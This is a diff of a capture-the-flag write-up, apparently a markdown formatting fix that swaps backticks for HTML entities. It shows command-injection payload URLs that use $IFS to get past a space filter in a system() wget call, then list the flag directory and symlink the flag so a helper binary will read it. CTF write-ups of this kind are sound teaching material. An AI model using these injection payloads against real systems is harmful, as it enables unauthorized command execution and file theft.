@@ -48,7 +48,7 @@ Considering that the `wget` is executed by `system()` function, we can think abo
 
 However, spaces are filtered from the `system()` command so you may have to use an internal field seperator to execute commands.
 
-```http://stypr.com:33/stypr?id=`ls$IFS../flag%7Cbase64`#.torrent```
+```http://stypr.com:33/stypr?id=&#96;ls$IFS../flag%7Cbase64&#96;#.torrent```
 
 This would give you the base64-encoded output of ../flag directory listing, which is decoded as
 
@@ -62,7 +62,7 @@ As we analyze the `use_me_to_read_flag` binary by performing a reverse-engineeri
 By symlinking the flag and loading the symlinked file would pop out the flag.
 
 ```
-http://stypr.com/stypr?id=`mkdir$IFS-p$IFS/tmp/stypr`#.torrent
-http://stypr.com:33/stypr?id=`ln$IFS-s$IFS/var/www/flag/flag$IFS/tmp/stypr/stypr`#.torrent
-http://stypr.com:33/stypr?id=`../flag/use_me_to_read_flag$IFS/tmp/stypr/stypr`#.torrent
+http://stypr.com/stypr?id=&#96;mkdir$IFS-p$IFS/tmp/stypr&#96;#.torrent
+http://stypr.com:33/stypr?id=&#96;ln$IFS-s$IFS/var/www/flag/flag$IFS/tmp/stypr/stypr&#96;#.torrent
+http://stypr.com:33/stypr?id=&#96;../flag/use_me_to_read_flag$IFS/tmp/stypr/stypr&#96;#.torrent
 ```
